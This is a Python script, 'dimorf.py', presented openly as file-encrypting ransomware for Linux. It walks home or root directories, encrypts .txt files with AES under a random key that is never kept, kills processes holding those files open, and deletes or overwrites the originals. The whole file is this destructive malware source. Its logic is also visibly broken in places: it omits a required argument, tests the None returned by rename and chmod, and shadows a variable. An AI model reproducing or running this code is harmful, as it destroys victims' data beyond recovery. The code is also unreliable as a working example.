#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# pylint: skip-file

__author__ = 'Wendel Ortiz -> aKa Ort0x36'
__maintainer__ = 'Wendel Ortiz'
__credits__ = ['Contributors']
__module__ = 'dimorf.py'

import psutil
import sys
import os
from Crypto.Cipher import AES
from Crypto import Random


def check_os(osname: str) -> str | None:
    if_linux = [
        prop for prop in os.uname() if (
            (prop == "Linux")
        ) and (
            (sys.platform == "linux")
        ) and (
            (os.name == osname)
        )
    ]

    if (if_linux):
        if (sys.version[0] == '3'):
            main(USER_DIR=os.getenv('HOME'),
                 ROOT_PATH="/root")


def find_files(
    path: str,
    ext_files: list,
    hidden: str,
    tmp_ext: str,
    new_ext: list,
    key: bytes,
    block_bytes: int
) -> str | None:

    for root, dirs, files in os.walk(path):
        for file in files:
            end_with_ext = [
                ext for ext in ext_files if (
                    file.endswith(
                        ext
                    )
                )
            ]

            if ((end_with_ext) and not (
                file.startswith(
                    hidden
                )
            )):

                if (
                    os.access(
                        os.path.join(
                            root,
                            file
                        ), os.F_OK
                    ) and (
                        os.access(
                            os.path.join(
                                root,
                                file
                            ), os.W_OK
                        )
                    ) and (
                        os.access(
                            os.path.join(
                                root,
                                file
                            ), os.R_OK
                        )
                    )
                ):
                    
                    if (
                        os.rename(
                            os.path.join(
                                root,
                                file
                            ),
                            os.path.join(
                                root,
                                f'{file}{tmp_ext}'
                            )
                        )
                    ):

                        # # iniciando processo.
                        init_vector = Random.new().read(32)
                        cipher = AES.new(
                            key,
                            AES.MODE_EAX,
                            init_vector
                        )

                        try:
                            
                            with open(os.path.join(root, file), 'rb') as f:
                                data = f.read(
                                    block_bytes
                                )

                            with open(os.path.join(root, file), 'wb') as f:
                                f.write(
                                    cipher.encrypt(
                                        data
                                    )
                                )

                            os.remove(
                                os.path.join(
                                    root,
                                    file
                                )
                            )

                        except KeyboardInterrupt:
                            sys.exit('Encerrado.')

                    else:
                        for proc in psutil.process_iter():
                            for file in proc.open_files():
                                if ((file.path) == (
                                    os.path.join(
                                        root,
                                        file
                                    )
                                ) and (
                                    proc.username() == (os.getenv(
                                        'USER'
                                    ))
                                )):
                                    
                                    try:
                                        
                                        proc.kill(
                                            proc.pid
                                        )
                                        
                                    except psutil.AccessDenied as e:
                                        raise (
                                            'Operação não permitida.'
                                        ) from e

                                    else:
                                        
                                        os.rename(
                                            os.path.join(
                                                root,
                                                file
                                            ),
                                            os.path.join(
                                                root,
                                                f'{file}{tmp_ext}'
                                            )
                                        )

                                        with open(os.path.join(root, file), 'rb') as f:
                                            data = f.read(
                                                block_bytes
                                            )

                                        with open(os.path.join(root, file), 'wb') as f:
                                            f.write(
                                                cipher.encrypt(
                                                    data
                                                )
                                            )

                                        os.remove(
                                            os.path.join(
                                                root,
                                                file
                                            )
                                        )

                else:
                    if (os.chmod(
                        os.path.join(
                            root,
                            file
                        ), 0o644
                    )):
                        
                        with open(os.path.join(root, file), 'rb') as f:
                            data = f.read(
                                block_bytes
                            )

                        with open(os.path.join(root, file), 'wb') as f:
                            f.write(
                                cipher.encrypt(
                                    data
                                )
                            )

                        os.remove(
                            os.path.join(
                                root,
                                file
                            )
                        )
                        
            else:
                sys.exit('Nenhum arquivo encontrado.')


def main(USER_DIR: str, ROOT_PATH: str) -> str | None:
    if os.getuid() == 0:
        if (
            not os.getenv(
                "ROOT_PATH"
            )
        ):

            if (
                os.system(
                    f'export ROOT_PATH="{ROOT_PATH}"'
                )
            ):
                
                USER_DIR = os.getenv(
                    "ROOT_PATH"
                )
                
                find_files(
                    path=USER_DIR,
                    ext_files=['.txt'],
                    hidden='.',
                    tmp_ext='.tmp',
                    new_ext='.fuxsocy',
                    key=Random.get_random_bytes(32)
                )

    else:
        find_files(
            path=USER_DIR,
            ext_files=['.txt'],
            hidden='.',
            tmp_ext='.tmp',
            new_ext='.fuxsocy',
            key=Random.get_random_bytes(32)
        )


if __name__ == '__main__':
    check_os(
        osname=os.name
    )
